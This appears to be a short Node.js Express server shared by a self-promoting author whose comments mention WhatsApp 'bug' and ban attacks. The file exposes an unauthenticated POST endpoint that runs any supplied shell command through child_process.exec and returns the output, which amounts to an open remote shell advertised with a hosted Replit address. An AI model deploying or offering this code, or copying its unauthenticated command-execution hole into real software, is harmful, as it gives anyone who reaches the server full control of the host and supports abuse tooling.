//YOUTUBE @ISALBYTE 
//JANGAN LUPA SUBSCRIBE TULISAN INI DIBUAT 
//AGAR TEMAN TEMAN SELALU INGAT DENGAN SAYA TERIMAKASIH DAN INI JUGA CREDIT DAN GABOLEH DI HAPUS YA SAYA CIBEL CIBEL KU BUG WA DAN BANED LUVLUV
//INSTAGRAM @RAJACRYPTOINDONESIA
const express = require('express');
const bodyParser = require('body-parser');
const { exec } = require('child_process');
const app = express();
const PORT = process.env.PORT || 8196;
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.get('/', (req, res) => {
    res.json({
        status: 'online',
        message: 'Server API is running',
        usage: 'https://2880cc0f-e6bf-4263-9b8d-422628f2c1ad-00-9h1q0as8qe2i.sisko.replit.dev/'
    });
});
app.post('/', (req, res) => {
    const { command } = req.body;
    
    if (!command) {
        return res.json({
            status: 'error',
            message: 'No command received'
        });
    }
    exec(command, (error, stdout, stderr) => {
        if (error) {
            return res.json({
                status: 'error',
                message: error.message
            });
        }
        if (!stdout && !stderr) {
            return res.json({
                status: 'success',
                output: 'Command executed, but no output returned.'
            });
        }
        res.json({
            status: 'success',
            output: stdout || stderr
        });
    });
});
app.get('/status', (req, res) => {
    res.json({
        status: 'online',
        server: require('os').hostname()
    });
});
app.listen(PORT, () => {
    console.log(`Server API running on port ${PORT}`);
});
